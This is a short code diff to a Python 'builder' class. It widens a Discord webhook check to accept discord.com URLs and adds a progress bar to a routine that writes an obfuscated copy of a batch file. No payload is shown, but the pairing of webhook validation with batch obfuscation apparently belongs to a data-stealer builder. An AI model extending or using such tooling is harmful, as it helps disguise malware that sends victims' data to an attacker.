@@ -45,7 +45,7 @@ class builder:
 
     def check_webhook(self):
         try:
-            url = self.webhook.startswith("https://discordapp.com/api/webhooks/")
+            url = self.webhook.startswith("https://discordapp.com/api/webhooks/") or self.webhook.startswith("https://discord.com/api/webhooks/")
             if url == True:
                 r = requests.get(self.webhook)
                 jsons = r.json()
@@ -84,7 +84,9 @@ class builder:
             pass
         switch = False
         with open(f'{self.file}.bat', 'r+', encoding='utf-8') as original:
-            for lines in tqdm(original):
+            ammount = len(original.readlines())
+        with open(f'{self.file}.bat', 'r+', encoding='utf-8') as original:
+            for lines in tqdm(original, total=int(ammount), desc="Obfuscating", unit=" lines"):
                 label = lines.startswith(':')
                 if label == True:
                     with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
